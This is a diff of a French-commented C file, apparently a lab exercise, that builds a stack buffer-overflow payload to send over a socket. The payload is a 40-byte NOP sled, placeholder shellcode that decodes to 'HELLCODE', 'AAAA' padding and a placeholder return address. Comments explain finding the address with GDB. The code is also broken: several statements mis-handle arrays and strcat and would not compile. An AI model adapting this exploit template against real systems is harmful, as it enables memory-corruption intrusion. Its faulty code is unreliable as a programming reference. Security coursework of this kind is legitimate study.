@@ -8,6 +8,37 @@
 
 // Voir fonction strcat pour concaténer des chars (string.h)
 
+char crafted_payload(){
+
+	// Serie de NOP
+	int nb_nop = 40;
+	char nops[nb_nop];
+	char un_nop[] = "\x90";
+	for (int i = 0; i < nb_nop; i++){
+		nops[i] = un_nop;
+	}
+	printf("%s\n", nops);
+
+	// Shellcode en dur
+	char shellcode[] = "\x48\x45\x4c\x4c\x43\x4f\x44\x45";
+	printf("%s\n", shellcode);
+
+	// Padding de bp
+	char padding_bp [] = "\x41\x41\x41\x41";
+	printf("%s\n", padding_bp);
+
+	// Adresse de retour en dur
+	char retour[] = "\x41\x44\x44\x52\x5f\x52\x45\x54";
+	printf("%s\n", retour);
+
+	strcat(nops, shellcode);
+	strcat(padding_bp, retour);
+	strcat(nops, padding_bp);
+	//printf("%s\n", nops);
+
+	return *nops;
+}
+
 int func(int sockfd, char *pay)
 {
 	printf("Overflow en cours...");
@@ -31,13 +62,18 @@ printf("Ox%lu\n", l);
 int main (int argc, char *argv[]){
 
 	int sockfd = 1; // A CHANGER ET METTRE L'ARG DE LA FCT A LA PLACE 
+
+
+	char payload[] = crafted_payload();
+	char (*my_func)() = crafted_payload;
+	//char payload = (*my_func)();
 	
     // Ecriture en dur du shellcode : 
     // NOP *40(etc 1 octet chaque)
 	// + shellcode (taille à définir POUR TAILLE BOF) 
     // + "A" *4(1 octet chaque)
 	// + @retour_dans_nop (== @relatif A CHERCHER GDB BASE PILE - [size(shellcode) + 4* A + moitié Nop])
-    char payload[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x42\x41\x41\x41\x41\x40"; // A COMPLETER
+    //char payload[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x48\x45\x4c\x4c\x43\x4f\x44\x45\x41\x41\x41\x41\x40"; // A COMPLETER
 
     // COMMENT @retour = @base pile + taille instruction ENTIERE
 
